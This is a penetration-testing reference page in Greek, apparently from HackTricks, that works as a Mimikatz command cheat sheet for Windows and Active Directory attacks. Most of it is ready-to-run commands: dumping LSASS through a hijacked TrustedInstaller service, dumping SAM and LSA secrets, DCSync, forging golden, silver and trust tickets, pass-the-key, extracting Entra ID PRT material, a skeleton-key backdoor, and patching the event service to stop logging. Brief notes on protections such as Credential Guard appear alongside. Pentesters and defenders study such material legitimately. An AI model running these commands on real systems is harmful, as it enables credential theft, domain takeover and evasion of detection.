# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**Αυτή η σελίδα βασίζεται σε μία από [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Δες το αρχικό για περισσότερες πληροφορίες!

## LM and Clear-Text in memory

Από τα Windows 8.1 και Windows Server 2012 R2 και μετά, έχουν εφαρμοστεί σημαντικά μέτρα για την προστασία από credential theft:

- Τα **LM hashes και plain-text passwords** δεν αποθηκεύονται πλέον στη μνήμη για να ενισχυθεί η ασφάλεια. Μια συγκεκριμένη ρύθμιση registry, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ πρέπει να οριστεί με τιμή DWORD `0` για να απενεργοποιηθεί το Digest Authentication, διασφαλίζοντας ότι οι "clear-text" passwords δεν αποθηκεύονται προσωρινά στο LSASS.

- Το **LSA Protection** εισάγεται για να προστατεύσει τη διεργασία Local Security Authority (LSA) από μη εξουσιοδοτημένο memory reading και code injection. Αυτό επιτυγχάνεται με τη σήμανση του LSASS ως protected process. Η ενεργοποίηση του LSA Protection περιλαμβάνει:
1. Τροποποίηση του registry στο _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ ορίζοντας το `RunAsPPL` σε `dword:00000001`.
2. Εφαρμογή ενός Group Policy Object (GPO) που επιβάλλει αυτή την αλλαγή registry σε όλα τα διαχειριζόμενα devices.

Παρά αυτές τις προστασίες, εργαλεία όπως το Mimikatz μπορούν να παρακάμψουν το LSA Protection χρησιμοποιώντας συγκεκριμένα drivers, αν και τέτοιες ενέργειες είναι πιθανό να καταγραφούν στα event logs.

Σε σύγχρονα workstations αυτό έχει ακόμη μεγαλύτερη σημασία επειδή το **Credential Guard είναι ενεργό by default σε πολλά Windows 11 22H2+ και Windows Server 2025 domain-joined, non-DC systems**, ενώ το **LSASS-as-PPL είναι ενεργό by default σε φρέσκες εγκαταστάσεις Windows 11 22H2+**. Στην πράξη, αυτό σημαίνει ότι το `sekurlsa::logonpasswords` συχνά επιστρέφει λιγότερα στοιχεία από όσα περίμενε το παλαιότερο tradecraft και οι operators στρέφονται ολοένα και περισσότερο σε **offline minidumps**, **Kerberos key extraction (`sekurlsa::ekeys`)**, ή **CloudAP/PRT-oriented modules**. Για την πλευρά της προστασίας, δες [Windows credentials protections](credentials-protections.md).

### Counteracting SeDebugPrivilege Removal

Οι administrators συνήθως έχουν SeDebugPrivilege, που τους επιτρέπει να κάνουν debug programs. Αυτό το privilege μπορεί να περιοριστεί για να αποτραπούν unauthorized memory dumps, μια συνηθισμένη τεχνική που χρησιμοποιούν attackers για να εξαγάγουν credentials από τη μνήμη. Ωστόσο, ακόμη και με αυτό το privilege αφαιρεμένο, ο λογαριασμός TrustedInstaller μπορεί ακόμη να εκτελεί memory dumps χρησιμοποιώντας μια προσαρμοσμένη service configuration:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
Αυτό επιτρέπει το dumping της μνήμης του `lsass.exe` σε ένα αρχείο, το οποίο στη συνέχεια μπορεί να αναλυθεί σε άλλο σύστημα για την εξαγωγή credentials:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatz Options

Το event log tampering στο Mimikatz περιλαμβάνει δύο κύριες ενέργειες: καθαρισμό event logs και patching του Event service για να αποτρέπεται η καταγραφή νέων events. Παρακάτω είναι οι εντολές για την εκτέλεση αυτών των ενεργειών:

#### Clearing Event Logs

- **Command**: Αυτή η ενέργεια στοχεύει στη διαγραφή των event logs, καθιστώντας πιο δύσκολη την παρακολούθηση κακόβουλων δραστηριοτήτων.
- Το Mimikatz δεν παρέχει άμεση εντολή στην τυπική του τεκμηρίωση για καθαρισμό event logs απευθείας μέσω της command line του. Ωστόσο, η χειραγώγηση event logs συνήθως περιλαμβάνει τη χρήση system tools ή scripts εκτός του Mimikatz για τον καθαρισμό συγκεκριμένων logs (π.χ. με χρήση PowerShell ή Windows Event Viewer).

#### Experimental Feature: Patching the Event Service

- **Command**: `event::drop`
- Αυτή η experimental εντολή έχει σχεδιαστεί για να τροποποιεί τη συμπεριφορά του Event Logging Service, αποτρέποντάς τον ουσιαστικά από την καταγραφή νέων events.
- Example: `mimikatz "privilege::debug" "event::drop" exit`

- Η εντολή `privilege::debug` διασφαλίζει ότι το Mimikatz λειτουργεί με τα απαραίτητα privileges για να τροποποιεί system services.
- Η εντολή `event::drop` στη συνέχεια κάνει patch το Event Logging service.

### Kerberos Ticket Attacks

Χρησιμοποιήστε τις παρακάτω εντολές ως γρήγορη υπενθύμιση syntax. Οι dedicated pages για [golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md), και [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) περιέχουν τις ενημερωμένες λεπτομέρειες για AES/PAC/opsec.

### Golden Ticket Creation

Ένα Golden Ticket επιτρέπει impersonation σε όλο το domain. Κύρια command και parameters:

- Command: `kerberos::golden`
- Parameters:
- `/domain`: Το όνομα του domain.
- `/sid`: Το Security Identifier (SID) του domain.
- `/user`: Το username που θα impersonate.
- `/krbtgt`: Το NTLM hash του KDC service account του domain.
- `/ptt`: Κάνει inject το ticket απευθείας στη μνήμη.
- `/ticket`: Αποθηκεύει το ticket για μελλοντική χρήση.

Example:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Δημιουργία Silver Ticket

Τα Silver Tickets παρέχουν πρόσβαση σε συγκεκριμένες υπηρεσίες. Βασική εντολή και παράμετροι:

- Command: Όμοια με το Golden Ticket αλλά στοχεύει συγκεκριμένες υπηρεσίες.
- Parameters:
- `/service`: Η υπηρεσία που θα στοχεύσεις (π.χ. cifs, http).
- Άλλες παράμετροι όμοιες με το Golden Ticket.

Example:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Δημιουργία Trust Ticket

Τα Trust Tickets χρησιμοποιούνται για πρόσβαση σε πόρους across domains εκμεταλλευόμενα trust relationships. Βασική εντολή και παράμετροι:

- Command: Παρόμοιο με Golden Ticket αλλά για trust relationships.
- Parameters:
- `/target`: Το FQDN του target domain.
- `/rc4`: Το NTLM hash για το trust account.

Example:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Additional Kerberos Commands

- **Listing Tickets**:

- Command: `kerberos::list`
- Παραθέτει όλα τα Kerberos tickets για την τρέχουσα session του χρήστη.

- **Pass the Cache**:

- Command: `kerberos::ptc`
- Injects Kerberos tickets from cache files.
- Example: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Pass the Ticket**:

- Command: `kerberos::ptt`
- Επιτρέπει τη χρήση ενός Kerberos ticket σε άλλη session.
- Example: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Purge Tickets**:
- Command: `kerberos::purge`
- Διαγράφει όλα τα Kerberos tickets από τη session.
- Χρήσιμο πριν από τη χρήση ticket manipulation commands για να αποφευχθούν conflicts.

### Over-Pass-the-Hash / Pass-the-Key

If `RC4` is disabled or unreliable, Mimikatz can patch **AES128/AES256 Kerberos keys** into the current logon session instead of only using an NT hash. This is usually a better fit for modern domains than treating `sekurlsa::pth` as NTLM-only.
```bash
mimikatz "privilege::debug" "sekurlsa::ekeys" exit
mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
```
`/impersonate` επαναχρησιμοποιεί την τρέχουσα διεργασία αντί να δημιουργεί ένα νέο console, κάτι που είναι χρήσιμο όταν θέλεις να εκτελέσεις αμέσως πράγματα όπως `lsadump::dcsync` στο ίδιο context.

### Active Directory Tampering

- **DCShadow**: Προσωρινά κάνει ένα machine να συμπεριφέρεται ως DC για AD object manipulation. Δείτε [DCShadow](../active-directory-methodology/dcshadow.md).

- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Μιμείται ένα DC για να ζητήσει password data. Δείτε [DCSync](../active-directory-methodology/dcsync.md).
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Credential Access

- **LSADUMP::LSA**: Εξάγει credentials από το LSA.

- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Παριστάνει ένα DC χρησιμοποιώντας password data ενός computer account.

- _Δεν παρέχεται συγκεκριμένη εντολή για το NetSync στο αρχικό context._

- **LSADUMP::SAM**: Πρόσβαση στην τοπική SAM database.

- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Αποκρυπτογραφεί secrets που είναι αποθηκευμένα στο registry.

- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Ορίζει ένα νέο NTLM hash για έναν user.

- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Ανακτά trust authentication information.
- `mimikatz "lsadump::trust" exit`

### Cloud credentials / Entra ID

Σε hosts με **Entra ID** ή **hybrid-joined**, το `sekurlsa::cloudap` μπορεί να αποκαλύψει cached υλικό **Primary Refresh Token (PRT)** από το LSASS. Αν το σχετικό Proof-of-Possession key είναι software-protected, το `dpapi::cloudapkd` μπορεί να παραγάγει το clear/derived key material που χρειάζεται για επόμενα **Pass-the-PRT** workflows.
```bash
mimikatz "privilege::debug" "sekurlsa::cloudap" exit
mimikatz "dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect" exit
mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
```
Αυτό γίνεται πολύ πιο δύσκολο όταν το key είναι TPM-backed, αλλά αξίζει να το ελέγξεις σε hybrid endpoints επειδή τα cached CloudAP data μπορεί να είναι πιο ενδιαφέροντα από το κλασικό `wdigest` output. Για το cloud-side abuse chain, δες [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html).

### Miscellaneous

- **MISC::Skeleton**: Inject a backdoor into LSASS on a DC.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Privilege Escalation

- **PRIVILEGE::Backup**: Acquire backup rights.

- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Obtain debug privileges.
- `mimikatz "privilege::debug" exit`

### Credential Dumping

- **SEKURLSA::LogonPasswords**: Show credentials for logged-on users.

- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Extract Kerberos tickets from memory.
- `mimikatz "sekurlsa::tickets /export" exit`

### Sid and Token Manipulation

- **SID::add/modify**: Change SID and SIDHistory.

- Add: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Modify: _No specific command for modify in original context._

- **TOKEN::Elevate**: Impersonate tokens.
- `mimikatz "token::elevate /domainadmin" exit`

### Terminal Services

- **TS::MultiRDP**: Allow multiple RDP sessions.

- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: List TS/RDP sessions.
- _No specific command provided for TS::Sessions in original context._

### Vault

- Extract passwords from Windows Vault.
- `mimikatz "vault::cred /patch" exit`


## References

- [The Hacker Tools – Mimikatz modules](https://tools.thehacker.recipes/mimikatz/modules/)
- [Synacktiv – WHFB and Entra ID: Say Hello to your new cache flow](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)

{{#include ../../banners/hacktricks-training.md}}
